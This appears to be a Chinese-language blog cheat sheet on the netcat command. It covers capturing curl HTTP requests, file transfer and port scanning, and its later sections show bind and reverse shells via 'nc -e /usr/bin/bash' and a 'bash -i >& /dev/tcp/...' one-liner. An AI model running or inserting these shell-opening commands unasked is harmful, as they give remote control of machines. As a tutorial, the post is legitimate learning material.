---
layout: post
title:  "命令 nc"
date:   2022-03-26 00:00:00 +0800
categories: Command
tags: [Linux, nc, netcat]
---

## 捕获 HTTP 请求的内容
1. 监听端口，用于捕获数据。
```shell
nc -l port 
```

2. 发送 HTTP 请求。
```shell
curl http://ip:port/
```

### GET 请求
```shell
curl http://127.0.0.1:8000/
```

```
GET /?name=wjj HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: curl/7.61.1
Accept: */*
```

### POST JSON 请求
```shell
curl --location --request POST 'http://127.0.0.1:8000/users_by_json' \
--header 'Content-Type: application/json' \
--data-raw '{
    "name": "wjj",
    "age": 40
}'
```

```
POST /users_by_json HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: curl/7.61.1
Accept: */*
Content-Type: application/json
Content-Length: 36

{
    "name": "wjj",
    "age": 40
}
```

### POST File 请求
```shell
curl --location --request POST 'http://127.0.0.1:8000/uploadfile' --form 'file=@"test.jpg"'
```

```
POST /uploadfile HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: curl/7.64.1
Accept: */*
Content-Length: 1604
Content-Type: multipart/form-data; boundary=------------------------f512f8a3c3a9b436
Expect: 100-continue

--------------------------f512f8a3c3a9b436
Content-Disposition: form-data; name="file"; filename="test.jpg"
Content-Type: image/jpeg

????JFIFHH??XExifMM?i&?? ? ??8Photoshop 3.08BIM8BIM%??ُ??	???B~?  "??
???w!1AQaq"2B????	#3R?br?
$4?%?&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz??????????????????????????????????????????????????????C
               ^????P????O????n?g??yH?ʑ0!??`??'??`{??=?	??O?N??\鳤????:???_u?.??|?;??߈2x?XO?y।M?? ?ŉ?
???d/i?+?Z]J?]2?Q2?:??ܨe?P??\?%?O?ʜ?N??=?????2?.?T?X?߽?k?w?????
--------------------------f512f8a3c3a9b436--
```

因为是二进制数据，所以有许多乱码，可以在使用 nc 监听时将接收到的数据写入到文件中。
```shell
nc -l port > output_file
```

整理后获得下面的格式:
```
--------------------------f512f8a3c3a9b436\r\n
Content-Disposition: form-data; name="file"; filename="test.jpg"\r\n
Content-type: image/jpeg\r\n
\r\n
file content binary
\r\n
--------------------------f512f8a3c3a9b436--\r\n
```

```--------------------------f512f8a3c3a9b436``` 是边界符，字母数字是随机生成的。在发送时指定的 ```Content-Type: multipart/form-data; boundary=------------------------f512f8a3c3a9b436``` 中的 boundary 值比组织数据中的少了 ```--``` (两个减号字符)

## 发送消息
* 服务器端
```shell
nc -l -p port 
```

* 客户端
```shell
nc server_ip server_port
```

现在在服务器端和客户端相当于是一个聊天软件，在任意一端发送消息，对方都会收到。

## 文件传输
### 客户端传输文件到服务器端
* 服务器端
```shell
nc -l -p port > output_file
```
文本或二进制都可以。

* 客户端
```shell
nc server_ip server_port < input_file
```

### 服务器端传输文件到客户端
* 服务器端
```shell
nc -l -p port < input_file
```

* 客户端
```shell
nc server_ip server_port > output_file
```

## 端口扫描
### 扫描目标服务器的端口
#### 一个端口
```shell
nc -n -z -w1 server_ip server_port
```

#### 端口范围
```shell
nc -n -z -w1 server_ip server_start_port-server_end_port
```
CentOS8上不能使用端口范围

### 扫描本机所有正在使用的端口
```shell
nc -n -z -w1 127.0.0.1 1-65535
```
```
Connection to 127.0.0.1 port 22 [tcp/*] succeeded!
Connection to 127.0.0.1 port 4000 [tcp/*] succeeded!
......
```

## 远程执行程序
### 客户端远程执行服务器端的程序
* 服务器端
```shell
nc -l -p port -e /usr/bin/bash
```

* 客户端
```shell
nc server_ip server_port
```
```shell
#显示服务器端的文件列表
ls
output.txt
test.jpg
#退出连接（服务器端程序也会退出）
exit
```

### 服务器端远程执行客户端的程序
* 服务器端
```shell
nc -l -p port
```

* 客户端
```shell
nc server_ip server_port -e /usr/bin/bash
```

* 服务器端
```shell
#显示客户端的文件列表
ls
input.txt
test.jpg
#退出连接（客户端程序也会退出）
exit
```

## 连接转发

## 反弹 Shell
* 服务器端
```shell
nc -lvp 8000
```

* 客户端
```shell
bash -i >& /dev/tcp/server_ip/server_port 0>&1
```

* 重定向符：>&
* 文件描述符：
    * 0 标准输入
    * 1 标准输出
    * 2 错误输出

* 服务器端

提示符和客户端一样，现在在服务器端操作就和在客户端操作是一样的。

## 参数
* -v 输出详细错误信息
* -n 不对目标机器进行DNS解析
* -z 只扫描监听守护进程，而不向它们发送任何数据。
* -w timeout 超时设置，单位（秒）

## 参考资料
* [Using netcat to catch request data from cUrl](https://blog.niklasottosson.com/mac/using-netcat-to-catch-request-data-from-curl/)
* [How to display request headers with command line curl](https://stackoverflow.com/questions/3252851/how-to-display-request-headers-with-command-line-curl)
* [How to send a header using a HTTP request through a cURL call?](https://stackoverflow.com/questions/356705/how-to-send-a-header-using-a-http-request-through-a-curl-call)
* [How to send http data with header and body ia curl](https://stackoverflow.com/questions/51365205/how-to-send-http-data-with-header-and-body-ia-curl)
